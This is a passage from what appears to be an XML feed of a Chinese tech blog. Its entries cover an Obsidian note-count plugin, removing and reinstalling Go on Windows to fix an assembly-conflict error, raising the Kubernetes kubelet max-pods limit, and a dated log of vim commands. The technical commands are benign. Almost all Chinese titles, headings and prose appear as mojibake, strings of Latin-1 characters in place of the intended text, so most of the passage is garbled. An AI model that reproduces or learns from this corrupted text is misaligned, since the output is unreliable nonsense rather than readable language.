    <link href="/2024/01/31/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9106.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E7%BB%9F%E8%AE%A1%E6%AF%8F%E4%B8%AA%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%AA%E6%95%B0%EF%BC%9FFile%20Explorer%20Note%20Count/"/>
    <url>/2024/01/31/obsidian/%E3%80%90obsidian%E7%B3%BB%E5%88%97%E3%80%9106.obsidian%E4%B8%AD%E5%A6%82%E4%BD%95%E7%BB%9F%E8%AE%A1%E6%AF%8F%E4%B8%AA%E6%96%87%E4%BB%B6%E5%A4%B9%E4%B8%8B%E6%96%87%E4%BB%B6%E7%9A%84%E4%B8%AA%E6%95%B0%EF%BC%9FFile%20Explorer%20Note%20Count/</url>
    
    <content type="html"><![CDATA[<p>ç›´æ¥åœ¨æ’ä»¶å¸‚åœºå®‰è£…å³å¯ï¼Œæ•ˆæœå›¾å¦‚ä¸‹ï¼š</p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240131131802.png" alt="image.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€goç³»åˆ—ã€‘(202401) windowsä¸‹goç¯å¢ƒçš„å®‰è£…ä¸åˆ é™¤</title>
    <link href="/2024/01/11/software/%E3%80%90go%E7%B3%BB%E5%88%97%E3%80%91(202401)%20windows%E4%B8%8Bgo%E7%8E%AF%E5%A2%83%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E5%88%A0%E9%99%A4/"/>
    <url>/2024/01/11/software/%E3%80%90go%E7%B3%BB%E5%88%97%E3%80%91(202401)%20windows%E4%B8%8Bgo%E7%8E%AF%E5%A2%83%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E5%88%A0%E9%99%A4/</url>
    
    <content type="html"><![CDATA[<h2 id="åˆ é™¤"><a href="#åˆ é™¤" class="headerlink" title="åˆ é™¤"></a>åˆ é™¤</h2><p>Windows. åˆ é™¤Go çš„æœ€ç®€å•æ–¹æ³•æ˜¯é€šè¿‡Windows æ§åˆ¶é¢æ¿ä¸­çš„æ·»åŠ &#x2F;åˆ é™¤ç¨‹åº:Â <strong>åœ¨æ§åˆ¶é¢æ¿ä¸­ï¼ŒåŒå‡»æ·»åŠ &#x2F;åˆ é™¤ç¨‹åº.</strong>Â <strong>åœ¨æ·»åŠ &#x2F;åˆ é™¤ç¨‹åºä¸­, é€‰æ‹©Go Programming Language, å•å‡»Uninstallï¼Œç„¶åæŒ‰ç…§æç¤ºè¿›è¡Œæ“ä½œ</strong>.</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">åˆ é™¤goç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶   D:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Go</span><br></code></pre></td></tr></table></figure><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># å¦‚ä½•ä¿®æ”¹GOPROXY</span><br>go env -w GOPROXY=https:<span class="hljs-regexp">//g</span>oproxy.cn,direct<br></code></pre></td></tr></table></figure><h2 id="è¿è¡Œä»£ç "><a href="#è¿è¡Œä»£ç " class="headerlink" title="è¿è¡Œä»£ç "></a>è¿è¡Œä»£ç </h2><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240111120757.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240111120742.png" alt="image.png"></p><p><a href="https://developer.aliyun.com/article/1042772">Windows Go å¼€å‘ç¯å¢ƒä¸‹è½½ã€å®‰è£…å¹¶é…ç½® -é˜¿é‡Œäº‘å¼€å‘è€…ç¤¾åŒº (aliyun.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>software</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€golandæŠ¥é”™è§£å†³ã€‘Acosh defined in both Go and assembly</title>
    <link href="/2024/01/11/tools/%E3%80%90goland%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E3%80%91Acosh%20defined%20in%20both%20Go%20and%20assembly/"/>
    <url>/2024/01/11/tools/%E3%80%90goland%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E3%80%91Acosh%20defined%20in%20both%20Go%20and%20assembly/</url>
    
    <content type="html"><![CDATA[<h2 id="æŠ¥é”™"><a href="#æŠ¥é”™" class="headerlink" title="æŠ¥é”™"></a>æŠ¥é”™</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">PS E:\code\go-helloworld&gt; go run main.go<br><span class="hljs-comment"># math</span><br>D:\Program Files\Go\src\math\acosh.go:43:6: Acosh defined <span class="hljs-keyword">in</span> both Go and assembly<br>D:\Program Files\Go\src\math\asin.go:20:6: Asin defined <span class="hljs-keyword">in</span> both Go and assembly<br>D:\Program Files\Go\src\math\asin.go:58:6: Acos defined <span class="hljs-keyword">in</span> both Go and assembly<br>D:\Program Files\Go\src\math\asinh.go:40:6: Asinh defined <span class="hljs-keyword">in</span> both Go and assembly<br>D:\Program Files\Go\src\math\atan.go:96:6: Atan defined <span class="hljs-keyword">in</span> both Go and assembly<br>D:\Program Files\Go\src\math\atan2.go:30:6: Atan2 defined <span class="hljs-keyword">in</span> both Go and assembly<br>D:\Program Files\Go\src\math\atanh.go:48:6: Atanh defined <span class="hljs-keyword">in</span> both Go and assembly<br>D:\Program Files\Go\src\math\cbrt.go:26:6: Cbrt defined <span class="hljs-keyword">in</span> both Go and assembly<br>D:\Program Files\Go\src\math\erf.go:189:6: Erf defined <span class="hljs-keyword">in</span> both Go and assembly<br>D:\Program Files\Go\src\math\erf.go:274:6: Erfc defined <span class="hljs-keyword">in</span> both Go and assembly<br>D:\Program Files\Go\src\math\erf.go:274:6: too many errors<br>PS E:\code\go-helloworld&gt;<br><br><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/ningan123/PicGo_Images/main/img/20240111111159.png" alt="image.png"></p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>åœ¨ç½‘ä¸ŠæŸ¥æ‰¾èµ„æ–™&amp;åˆ†ææŠ¥é”™ï¼Œå¯æ¨æ–­å‡ºç¯å¢ƒé‡Œé‡å¤çš„ä¸œè¥¿ï¼Œæ‰€ä»¥æ‰“ç®—æŠŠgoç¯å¢ƒåˆ é™¤ï¼Œå†å®‰è£…ä¸€ä¸ªè¯•è¯•</p><h2 id="åˆ é™¤"><a href="#åˆ é™¤" class="headerlink" title="åˆ é™¤"></a>åˆ é™¤</h2><p>Windows. åˆ é™¤Go çš„æœ€ç®€å•æ–¹æ³•æ˜¯é€šè¿‡Windows æ§åˆ¶é¢æ¿ä¸­çš„æ·»åŠ &#x2F;åˆ é™¤ç¨‹åº:Â <strong>åœ¨æ§åˆ¶é¢æ¿ä¸­ï¼ŒåŒå‡»æ·»åŠ &#x2F;åˆ é™¤ç¨‹åº.</strong>Â <strong>åœ¨æ·»åŠ &#x2F;åˆ é™¤ç¨‹åºä¸­, é€‰æ‹©Go Programming Language, å•å‡»Uninstallï¼Œç„¶åæŒ‰ç…§æç¤ºè¿›è¡Œæ“ä½œ</strong>.</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">åˆ é™¤goç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶   D:<span class="hljs-string">\Program</span> Files<span class="hljs-string">\Go</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼šç¬¬ä¸€æ¬¡åˆ é™¤çš„æ—¶å€™ï¼Œæ²¡æœ‰åˆ é™¤goç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œå®‰è£…ä¹‹åï¼Œè¿˜æ˜¯ä¸€æ ·çš„æŠ¥é”™ï¼›ç¬¬äºŒæ¬¡æŠŠgoç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶éƒ½åˆ é™¤ï¼Œå†æ¬¡å®‰è£…å°±å¯ä»¥æ­£å¸¸è¿è¡Œäº†</p><h2 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># å¦‚ä½•ä¿®æ”¹GOPROXY</span><br>go env -w GOPROXY=https:<span class="hljs-regexp">//g</span>oproxy.cn,direct<br></code></pre></td></tr></table></figure><p><a href="https://developer.aliyun.com/article/1042772">Windows Go å¼€å‘ç¯å¢ƒä¸‹è½½ã€å®‰è£…å¹¶é…ç½® -é˜¿é‡Œäº‘å¼€å‘è€…ç¤¾åŒº (aliyun.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>tools</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€k8sç³»åˆ—ã€‘(202401) ä¿®æ”¹k8sé™åˆ¶èŠ‚ç‚¹å¯åŠ¨çš„Podæ•°é‡</title>
    <link href="/2024/01/10/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202401)%20%E4%BF%AE%E6%94%B9k8s%E9%99%90%E5%88%B6%E8%8A%82%E7%82%B9%E5%90%AF%E5%8A%A8%E7%9A%84Pod%E6%95%B0%E9%87%8F/"/>
    <url>/2024/01/10/k8s/%E3%80%90k8s%E7%B3%BB%E5%88%97%E3%80%91(202401)%20%E4%BF%AE%E6%94%B9k8s%E9%99%90%E5%88%B6%E8%8A%82%E7%82%B9%E5%90%AF%E5%8A%A8%E7%9A%84Pod%E6%95%B0%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="æ–¹æ³•1"><a href="#æ–¹æ³•1" class="headerlink" title="æ–¹æ³•1"></a>æ–¹æ³•1</h1><p>ä¿®æ”¹kubeletçš„é…ç½®</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--max-pods int32Â Â Â Â Â é»˜è®¤å€¼ï¼š110</span><br></code></pre></td></tr></table></figure><h1 id="æ–¹æ³•2"><a href="#æ–¹æ³•2" class="headerlink" title="æ–¹æ³•2"></a>æ–¹æ³•2</h1><p>ä¿®æ”¹kubeletçš„é…ç½®æ–‡ä»¶ é»˜è®¤ï¼š110</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">maxPods</span>: <span class="hljs-number">300</span> <br></code></pre></td></tr></table></figure><p><a href="https://kubernetes.io/zh-cn/docs/reference/command-line-tools-reference/kubelet/">kubelet | Kubernetes</a>  æ–¹æ³•1<br><a href="https://kubernetes.io/zh-cn/docs/reference/config-api/kubelet-config.v1beta1/">Kubelet é…ç½® (v1beta1) | Kubernetes</a>  æ–¹æ³•2</p>]]></content>
    
    
    <categories>
      
      <category>k8s</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ã€linuxç³»åˆ—ã€‘vimå‘½ä»¤æ¯æ—¥å­¦ä¹ </title>
    <link href="/2024/01/07/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91vim%E5%91%BD%E4%BB%A4%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0/"/>
    <url>/2024/01/07/linux/%E3%80%90linux%E7%B3%BB%E5%88%97%E3%80%91vim%E5%91%BD%E4%BB%A4%E6%AF%8F%E6%97%A5%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>å‰è¨€ï¼šå¬è¯´ï¼Œåªè¦æŠŠvimå­¦ä¼šäº†ï¼Œå°±å†ä¹Ÿä¸æƒ³ç”¨åˆ«çš„ç¼–è¾‘å™¨äº†ï¼Œæƒ³è¯•è¯•è¿™å¥è¯æ˜¯ä¸æ˜¯çœŸçš„ï¼å­¦viméä¸€æ—¥ä¹‹åŠŸï¼Œé‡åœ¨å¤šç”¨ã€‚æˆ‘ä»¬ï¼Œæ…¢æ…¢æ¥ï¼<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”</p><p><a href="https://www.cnblogs.com/hxf-changmylife/p/5918052.html">å‚è€ƒå­¦ä¹ é“¾æ¥</a><br><a href="https://blog.csdn.net/niushuai666/article/details/7275406">å‚è€ƒå­¦ä¹ é“¾æ¥</a></p><h1 id="2021-01-04-ä¸€"><a href="#2021-01-04-ä¸€" class="headerlink" title="2021.01.04(ä¸€)"></a>2021.01.04(ä¸€)</h1><h2 id="ç²˜è´´å¤åˆ¶åˆ é™¤"><a href="#ç²˜è´´å¤åˆ¶åˆ é™¤" class="headerlink" title="ç²˜è´´å¤åˆ¶åˆ é™¤"></a>ç²˜è´´å¤åˆ¶åˆ é™¤</h2><p><font color=red>æ™®é€šæ¨¡å¼ä¸‹ï¼š</font></p><p>dd â†’ åˆ é™¤å½“å‰è¡Œï¼Œå¹¶æŠŠåˆ é™¤çš„è¡Œå­˜åˆ°å‰ªè´´æ¿é‡Œ   (è¾…åŠ©è®°å¿†ï¼šdelete)<br>yy â†’ æ‹·è´å½“å‰è¡Œ<br>p â†’ ç²˜è´´  åœ¨å½“å‰ä½ç½®ä¹‹å   (è¾…åŠ©è®°å¿†ï¼špaste)<br>P â†’ ç²˜è´´ åœ¨å½“å‰ä½ç½®ä¹‹å‰   (è¾…åŠ©è®°å¿†ï¼šæˆ‘ä»¬ä¸€èˆ¬æ‰“å­—éƒ½æ˜¯ä»å‰å¾€åæ‰“ï¼Œä¸€èˆ¬æƒ…å†µä¹Ÿæ˜¯å°å†™ï¼Œæ‰€ä»¥å°å†™çš„æ˜¯ä»åçš„ï¼Œå¤§å†™çš„ä¸å¤ªå¸¸è§ï¼Œæ˜¯å¾€å‰çš„)<br>x â†’ åˆ å½“å‰å…‰æ ‡æ‰€åœ¨çš„ä¸€ä¸ªå­—ç¬¦   (è¾…åŠ©è®°å¿†ï¼šæˆ‘ä»¬æ˜¯ä¸æ˜¯å¸¸ç”¨ctrl+xè¡¨ç¤ºå‰ªåˆ‡å˜›ï¼Œè¿™ä¸ªä¹Ÿæ˜¯xå‘€ï¼Œè”æƒ³è®°å¿†)</p><h1 id="2021-01-13-ä¸‰"><a href="#2021-01-13-ä¸‰" class="headerlink" title="2021.01.13(ä¸‰)"></a>2021.01.13(ä¸‰)</h1><h2 id="å„ç§æ’å…¥æ¨¡å¼"><a href="#å„ç§æ’å…¥æ¨¡å¼" class="headerlink" title="å„ç§æ’å…¥æ¨¡å¼"></a>å„ç§æ’å…¥æ¨¡å¼</h2><p><font color=red>æ™®é€šæ¨¡å¼(å³ï¼Œå‘½ä»¤è¡Œæ¨¡å¼)ä¸‹ï¼š</font></p><p>a â†’ åœ¨å…‰æ ‡åæ’å…¥<br>o â†’ åœ¨å½“å‰è¡Œåæ’å…¥ä¸€ä¸ªæ–°è¡Œ<br>O â†’ åœ¨å½“å‰è¡Œå‰æ’å…¥ä¸€ä¸ªæ–°è¡Œ (å¤§å†™o)</p><h2 id="ç®€å•çš„ç§»åŠ¨å…‰æ ‡"><a href="#ç®€å•çš„ç§»åŠ¨å…‰æ ‡" class="headerlink" title="ç®€å•çš„ç§»åŠ¨å…‰æ ‡"></a>ç®€å•çš„ç§»åŠ¨å…‰æ ‡</h2><p>0 â†’ æ•°å­—é›¶ï¼Œåˆ°è¡Œå¤´<br>$ â†’ åˆ°æœ¬è¡Œè¡Œå°¾<br>^ â†’ åˆ°æœ¬è¡Œç¬¬ä¸€ä¸ªä¸æ˜¯blankå­—ç¬¦çš„ä½ç½®ï¼ˆæ‰€è°“blankå­—ç¬¦å°±æ˜¯ç©ºæ ¼ï¼Œtabï¼Œæ¢è¡Œï¼Œå›è½¦ç­‰ï¼‰<br>g_ â†’ åˆ°æœ¬è¡Œæœ€åä¸€ä¸ªä¸æ˜¯blankå­—ç¬¦çš„ä½ç½®</p><h2 id="æœç´¢æŸä¸ªå­—ç¬¦ä¸²"><a href="#æœç´¢æŸä¸ªå­—ç¬¦ä¸²" class="headerlink" title="æœç´¢æŸä¸ªå­—ç¬¦ä¸²"></a>æœç´¢æŸä¸ªå­—ç¬¦ä¸²</h2><p><a href="https://www.cnblogs.com/z-x-y/p/9198481.html">å‚è€ƒé“¾æ¥</a></p><h3 id="ä»å¼€å¤´æœç´¢"><a href="#ä»å¼€å¤´æœç´¢" class="headerlink" title="ä»å¼€å¤´æœç´¢"></a>ä»å¼€å¤´æœç´¢</h3><p>åœ¨<font color=red>æ™®é€šæ¨¡å¼ä¸‹</font>ï¼Œè¾“å…¥<font color=red>&#x2F;ä½ è¦æŸ¥æ‰¾çš„å­—ç¬¦</font><br>eg.ä½ è¦æŸ¥æ‰¾â€œå®‰å®‰â€ï¼Œå°±åœ¨æ™®é€šæ¨¡å¼ä¸‹ï¼Œè¾“å…¥&#x2F;å®‰å®‰</p><p>æŒ‰ä¸‹<font color=red>å›è½¦</font>ï¼Œå¯ä»¥çœ‹åˆ°vimæŠŠå…‰æ ‡ç§»åŠ¨åˆ°è¯¥å­—ç¬¦å¤„</p><p>å†æŒ‰<font color=red>nï¼ˆå°å†™ï¼‰</font>æŸ¥çœ‹ä¸‹ä¸€ä¸ªåŒ¹é…  å…‰æ ‡å¾€ä¸‹ç§»<br>æŒ‰<font color=red>N(å¤§å†™ï¼‰</font>æŸ¥çœ‹ä¸Šä¸€ä¸ªåŒ¹é…ï¼ˆcapslockåˆ‡æ¢å¤§å°å†™ï¼Œä¹Ÿå¯ä»¥åœ¨å°å†™çŠ¶æ€ä¸‹æŒ‰shift+nï¼‰</p><h3 id="ä»ç»“å°¾å¤„æœç´¢"><a href="#ä»ç»“å°¾å¤„æœç´¢" class="headerlink" title="ä»ç»“å°¾å¤„æœç´¢"></a>ä»ç»“å°¾å¤„æœç´¢</h3><p>åœ¨<font color=red>æ™®é€šæ¨¡å¼ä¸‹</font>ï¼Œè¾“å…¥<font color=red>ï¼Ÿä½ è¦æŸ¥æ‰¾çš„å­—ç¬¦</font><br>å†æŒ‰<font color=red>nï¼ˆå°å†™ï¼‰</font> å…‰æ ‡å¾€ä¸Šç§»<br>æŒ‰<font color=red>N(å¤§å†™ï¼‰</font></p><h3 id="å°é—®é¢˜"><a href="#å°é—®é¢˜" class="headerlink" title="å°é—®é¢˜"></a>å°é—®é¢˜</h3><p>æœç´¢åï¼Œå‘ç°å½“å‰æ–‡ä»¶å’Œåˆ«çš„æ–‡ä»¶å‘ç°ä¹Ÿè¢«é«˜äº®äº†ï¼Œæ€ä¹ˆå…³é—­<br><font color=red>æ™®é€šæ¨¡å¼</font>ä¸‹ï¼Œè¾“å…¥ï¼šnohlsearchæˆ–è€…ï¼šset nohlsearch<br>å¯ä»¥ç®€å†™æˆ<font color=red>noh</font>æˆ–set-noh<br>(è”æƒ³è®°å¿†ï¼šhlâ€”highlight è¡¨ç¤ºé«˜äº®)</p><h1 id="2021-01-22-äº”"><a href="#2021-01-22-äº”" class="headerlink" title="2021.01.22(äº”)"></a>2021.01.22(äº”)</h1><h2 id="vim-å¦‚ä½•é€šè¿‡å‘½ä»¤å¿«æ·è·³è½¬åˆ°æ–‡ä»¶å¤´-amp-æ–‡ä»¶å°¾-ï¼Ÿ"><a href="#vim-å¦‚ä½•é€šè¿‡å‘½ä»¤å¿«æ·è·³è½¬åˆ°æ–‡ä»¶å¤´-amp-æ–‡ä»¶å°¾-ï¼Ÿ" class="headerlink" title="vim å¦‚ä½•é€šè¿‡å‘½ä»¤å¿«æ·è·³è½¬åˆ°æ–‡ä»¶å¤´ &amp; æ–‡ä»¶å°¾ ï¼Ÿ"></a>vim å¦‚ä½•é€šè¿‡å‘½ä»¤å¿«æ·è·³è½¬åˆ°æ–‡ä»¶å¤´ &amp; æ–‡ä»¶å°¾ ï¼Ÿ</h2><p><a href="https://blog.csdn.net/dieyong/article/details/80971415">å‚è€ƒåšå®¢</a></p><p><font color=red>æ™®é€šæ¨¡å¼(å³ï¼Œå‘½ä»¤è¡Œæ¨¡å¼)ä¸‹ï¼š</font></p><p>æ–¹å¼1 ï¼š<br>è·³è½¬åˆ°æ–‡ä»¶å¤´è¾“å…¥å†’å·(:)ï¼Œæ‰“å¼€å‘½ä»¤è¾“å…¥æ¡†è¾“å…¥å‘½ä»¤1ï¼Œï¼ˆæ³¨ï¼šæ˜¯æ•°å­—1ï¼‰<br>è·³è½¬åˆ°æ–‡ä»¶å°¾è¾“å…¥å†’å·(:)ï¼Œæ‰“å¼€å‘½ä»¤è¾“å…¥æ¡†è¾“å…¥å‘½ä»¤ï¼š$</p><p>æ–¹å¼2 ï¼š<br>gg:å‘½ä»¤å°†å…‰æ ‡ç§»åŠ¨åˆ°æ–‡æ¡£å¼€å¤´<br>G:å‘½ä»¤å°†å…‰æ ‡ç§»åŠ¨åˆ°æ–‡æ¡£æœ«å°¾</p><h1 id="2021-03-17-ä¸‰"><a href="#2021-03-17-ä¸‰" class="headerlink" title="2021.03.17(ä¸‰)"></a>2021.03.17(ä¸‰)</h1><h2 id="ä½¿ç”¨-hjkl-ç§»åŠ¨å…‰æ ‡"><a href="#ä½¿ç”¨-hjkl-ç§»åŠ¨å…‰æ ‡" class="headerlink" title="ä½¿ç”¨ hjkl ç§»åŠ¨å…‰æ ‡"></a>ä½¿ç”¨ hjkl ç§»åŠ¨å…‰æ ‡</h2><p>hjkl   å·¦ä¸‹ä¸Šå³</p><h2 id="Undo-x2F-Redo"><a href="#Undo-x2F-Redo" class="headerlink" title="Undo&#x2F;Redo"></a>Undo&#x2F;Redo</h2><p>u â†’ undo<br>Ctrl+r â†’ redo</p><h2 id="æ‰“å¼€-x2F-ä¿å­˜-x2F-é€€å‡º-x2F-æ”¹å˜æ–‡ä»¶-Buffer"><a href="#æ‰“å¼€-x2F-ä¿å­˜-x2F-é€€å‡º-x2F-æ”¹å˜æ–‡ä»¶-Buffer" class="headerlink" title="æ‰“å¼€&#x2F;ä¿å­˜&#x2F;é€€å‡º&#x2F;æ”¹å˜æ–‡ä»¶(Buffer)"></a>æ‰“å¼€&#x2F;ä¿å­˜&#x2F;é€€å‡º&#x2F;æ”¹å˜æ–‡ä»¶(Buffer)</h2><p>:e &lt;path&#x2F;to&#x2F;file&gt; â†’ æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶<br>:saveas &lt;path&#x2F;to&#x2F;file&gt; â†’ å¦å­˜ä¸º &lt;path&#x2F;to&#x2F;file&gt;<br>:bn å’Œ :bp â†’ ä½ å¯ä»¥åŒæ—¶æ‰“å¼€å¾ˆå¤šæ–‡ä»¶ï¼Œä½¿ç”¨è¿™ä¸¤ä¸ªå‘½ä»¤æ¥åˆ‡æ¢ä¸‹ä¸€ä¸ªæˆ–ä¸Šä¸€ä¸ªæ–‡ä»¶ã€‚</p><p>:w â†’ å­˜ç›˜<br>:wq â†’ å­˜ç›˜ + é€€å‡º (:w å­˜ç›˜, :q é€€å‡º)<br>:q! â†’ é€€å‡ºä¸ä¿å­˜<br>:qa! å¼ºè¡Œé€€å‡ºæ‰€æœ‰çš„æ­£åœ¨ç¼–è¾‘çš„æ–‡ä»¶ï¼Œå°±ç®—åˆ«çš„æ–‡ä»¶æœ‰æ›´æ”¹ã€‚</p><h1 id="2021-03-18-å››"><a href="#2021-03-18-å››" class="headerlink" title="2021.03.18(å››)"></a>2021.03.18(å››)</h1><p>æ›´å¥½ï¼Œæ›´å¼ºï¼Œæ›´å¿«<br>å…ˆæ­å–œä½ ï¼ä½ å¹²çš„å¾ˆä¸é”™ã€‚æˆ‘ä»¬å¯ä»¥å¼€å§‹ä¸€äº›æ›´ä¸ºæœ‰è¶£çš„äº‹äº†ã€‚åœ¨ç¬¬ä¸‰çº§ï¼Œæˆ‘ä»¬åªè°ˆé‚£äº›å’Œviå¯ä»¥å…¼å®¹çš„å‘½ä»¤ã€‚</p><h2 id="vimæ˜¯æ€ä¹ˆé‡å¤è‡ªå·±çš„"><a href="#vimæ˜¯æ€ä¹ˆé‡å¤è‡ªå·±çš„" class="headerlink" title="vimæ˜¯æ€ä¹ˆé‡å¤è‡ªå·±çš„"></a>vimæ˜¯æ€ä¹ˆé‡å¤è‡ªå·±çš„</h2><p>ä¸‹é¢ï¼Œè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹vimæ˜¯æ€ä¹ˆé‡å¤è‡ªå·±çš„ï¼š</p><p>. â†’ (å°æ•°ç‚¹) å¯ä»¥é‡å¤ä¸Šä¸€æ¬¡çš„å‘½ä»¤<br>N<command> â†’ é‡å¤æŸä¸ªå‘½ä»¤Næ¬¡</p><blockquote><p>ä¸‹é¢æ˜¯ä¸€ä¸ªç¤ºä¾‹ï¼Œæ‰¾å¼€ä¸€ä¸ªæ–‡ä»¶ä½ å¯ä»¥è¯•è¯•ä¸‹é¢çš„å‘½ä»¤ï¼š<br>2dd â†’ åˆ é™¤2è¡Œ<br>3p â†’ ç²˜è´´æ–‡æœ¬3æ¬¡<br>100idesu [ESC] â†’ ä¼šå†™ä¸‹ â€œdesu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu desu â€œ<br>. â†’ é‡å¤ä¸Šä¸€ä¸ªå‘½ä»¤â€”â€” 100 â€œdesu â€œ.<br>3. â†’ é‡å¤ 3 æ¬¡ â€œdesuâ€ (æ³¨æ„ï¼šä¸æ˜¯ 300ï¼Œä½ çœ‹ï¼ŒVIMå¤šèªæ˜å•Š).</p></blockquote><h2 id="å…‰æ ‡ç§»åŠ¨æ›´æœ‰æ•ˆç‡"><a href="#å…‰æ ‡ç§»åŠ¨æ›´æœ‰æ•ˆç‡" class="headerlink" title="å…‰æ ‡ç§»åŠ¨æ›´æœ‰æ•ˆç‡"></a>å…‰æ ‡ç§»åŠ¨æ›´æœ‰æ•ˆç‡</h2><p>NG â†’ åˆ°ç¬¬ N è¡Œ ï¼ˆæ³¨æ„å‘½ä»¤ä¸­çš„Gæ˜¯å¤§å†™çš„ï¼Œå¦æˆ‘ä¸€èˆ¬ä½¿ç”¨ : N åˆ°ç¬¬Nè¡Œï¼Œå¦‚ :137 åˆ°ç¬¬137è¡Œï¼‰<br>gg â†’ åˆ°ç¬¬ä¸€è¡Œï¼ˆç›¸å½“äº1Gï¼Œæˆ– :1ï¼‰<br>G â†’ åˆ°æœ€åä¸€è¡Œ</p><p>æŒ‰å•è¯ç§»åŠ¨ï¼š</p><ul><li>w â†’ åˆ°ä¸‹ä¸€ä¸ªå•è¯çš„å¼€å¤´ã€‚</li><li>e â†’ åˆ°ä¸‹ä¸€ä¸ªå•è¯çš„ç»“å°¾ã€‚<blockquote><p>å¦‚æœä½ è®¤ä¸ºå•è¯æ˜¯ç”±é»˜è®¤æ–¹å¼ï¼Œé‚£ä¹ˆå°±ç”¨å°å†™çš„eå’Œwã€‚é»˜è®¤ä¸Šæ¥è¯´ï¼Œä¸€ä¸ªå•è¯ç”±å­—æ¯ï¼Œæ•°å­—å’Œä¸‹åˆ’çº¿ç»„æˆï¼ˆæ³¨ï¼šç¨‹åºå˜é‡ï¼‰<br>å¦‚æœä½ è®¤ä¸ºå•è¯æ˜¯ç”±blankå­—ç¬¦åˆ†éš”ç¬¦ï¼Œé‚£ä¹ˆä½ éœ€è¦ä½¿ç”¨å¤§å†™çš„Eå’ŒWã€‚ï¼ˆæ³¨ï¼šç¨‹åºè¯­å¥ï¼‰</p></blockquote></li></ul><p>æœ€å¼ºçš„å…‰æ ‡ç§»åŠ¨ï¼š</p><ul><li>% : åŒ¹é…æ‹¬å·ç§»åŠ¨ï¼ŒåŒ…æ‹¬ (, {, [. ï¼ˆæ³¨ï¼šä½ éœ€è¦æŠŠå…‰æ ‡å…ˆç§»åˆ°æ‹¬å·ä¸Šï¼‰</li><li>* å’Œ #:  åŒ¹é…å…‰æ ‡å½“å‰æ‰€åœ¨çš„å•è¯ï¼Œç§»åŠ¨å…‰æ ‡åˆ°ä¸‹ä¸€ä¸ªï¼ˆæˆ–ä¸Šä¸€ä¸ªï¼‰åŒ¹é…å•è¯ï¼ˆ*æ˜¯ä¸‹ä¸€ä¸ªï¼Œ#æ˜¯ä¸Šä¸€ä¸ªï¼‰</li></ul><h1 id="2021-03-22-ä¸€"><a href="#2021-03-22-ä¸€" class="headerlink" title="2021.03.22(ä¸€)"></a>2021.03.22(ä¸€)</h1><h2 id="å’Œç§»åŠ¨å…‰æ 